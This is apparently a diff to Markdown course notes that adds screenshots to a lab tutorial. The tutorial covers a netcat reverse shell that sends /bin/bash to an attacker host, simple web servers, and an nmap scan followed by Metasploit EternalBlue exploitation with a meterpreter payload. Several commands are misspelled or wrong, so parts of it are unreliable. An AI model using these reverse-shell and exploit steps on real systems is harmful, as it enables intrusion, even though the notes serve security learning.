@@ -58,7 +58,8 @@ onsoles are established with other computers over the network.
 -          sudo nc -lvpn "port" -s "your in "
 -          Exmaple: sudo nc -lvpn 87 -s 192.160.0.0
 - on Attacker computer now listening 
-c![finding](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/90d40f21-0a34-44b4-9d4c-893b9e2e4e9e)
+
+![attcker1](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/1148719c-5c53-4a39-b36d-736f56db9bca)
 
 ### B is on client/victem side
 
@@ -66,10 +67,12 @@ c![finding](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/90d40f21-
 -          sudo nc -e /bin/bash "attackerip' "port"
 - N.b when entering port on victem side equal to attacker listning port
 -        Example: sudo nc -e /bin/bash 192.160.0.0 87  
+![kalirepo](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/0e7322fd-d3bb-46a4-80be-91b37d2e71dc)
 - when you Enter the attacker gain reverse shell
+![reverseshell](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/68dc4f40-14cc-43c7-976b-89fa5f9d414f)
 
 
- ##  Web servers![attaker]
+ ##  Web servers
 
 - On the hardware side, a web server is a computer that stores web server software and a website's component files (for example, HTML documents, images, CSS stylesheets, and JavaScript files).
 - A web server connects to the Internet and supports physical data interchange with other devices connected to the web.
@@ -85,12 +88,17 @@ c![finding](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/90d40f21-
 - #### Web Server - apache
 - It only Browse their own directory go to  /var/www/html type this `` cd /var/www/html ``
 - The website you see on the right side is the default web for apache2 the file for this is the “index.html”
-- From now on our computer is acting like a webserver, it by default port 80 
+- From now on our computer is acting like a webserver, it by default port 80
+- 
+
 - To view appche server  go to your browser and search your ip with : port, Example: ``192.160.0.0:80``
 - To stop your apache go to your terminal and type ``sudo systemctl stop apache2``
+![start apache2](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/da2c2f5c-014e-4466-b933-109e0a2d4d40)
 ## B. Python Server
 - We can you python to start web servers
-- To start the service ``python3 -m http.server port Number`` Example: `` python3 -m server.http 9090`` 
+- To start the service ``python3 -m http.server port Number`` Example: `` python3 -m http.server 9090``
+- ![python server](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/2e929e29-d711-4e11-a05f-8e6d6cb3f740)
+
 - To get accsse goto your browser search your ip aderss with : prot number Example ``192.160.0.0:9090
 - It host it run path like /Desktop  /Download  it display only it path file :
 - The python will help you to host website from any path on your computer with any port you need.
@@ -174,18 +182,31 @@ c![finding](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/90d40f21-
 - Before we start we must gather information about the system. 
 - We should know about their OS system.(os detection) use nmap
 - “sudo nmap -A <victim>” Example: ``sudo namp -A 192.160.0.0``
+- ![scanning](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/3c37a9e1-efa7-4832-8e35-097085611581)
+
 - ### B) Starting Metasploit
 - In your terminal do not have metasploit you must install it especially on ubuntu ``sudo apt install metasploit -y``
 -  after install start it in this command ``msfconsole -q``
 - Type this command to search enteral blue exploitation
-1) ``search exploit window/smb/window/sumb`` and you will see list and find enternal blue 
+1) ``search exploit window/smb/window/sumb`` and you will see list and find enternal blue
+ 
+![use](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/70b5c10a-5d7c-403c-9925-b1462f40288f)
+
 2) Type this to use ``use window exploit/sub/window/sumb/ms17_010_enternal_blue`` or select it containing number and type ``use 19`` or type 19 containing characters.
 3) And insert victim ip set RHOST <VIctim ip> Example: ``set RHOS 192.168.0.0``
+   ![victem](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/272fa6d1-fdbf-498e-982b-c3b2d26a5278)
+
 4) insert Attacker ip E.g set LHOST <your ip> used for listen for victim Example: ``set LHOST 10.0.2.0``
+ ![haker](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/759be0ce-a889-4e8a-b69f-e59f24066312)
+
 5) After that set payloads we get a reverse meterpreter shell to access the victim computer to enable us to use this command .
 - And type this ``set payload windows/x64/meterpreter/reverse_http``
 - *Payloads are:-a malicious software programed to execute targeted system*
+- ![payload](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/9cdd03ec-faec-4885-8880-38097c73b5dd)
+
 6) Check your listener if they exist, run it, otherwise you write commands 3 and 4 steps again. ``Show options`` use this command.
+   ![show option](https://github.com/Yaredcyber/GTST_COURSE/assets/147349965/df041e57-4602-4b52-8538-a1cc7f34bd2e)
+
 7) Run/Exploit use this command ``run or exploit `` then you willget reves shell in meterpreter BOOM!!!🔥🔥🔥🔥
 - For more check my video my (vide0)[https://www.kapwing.com/videos/65639fbe9f5842a9e206eff0]
 
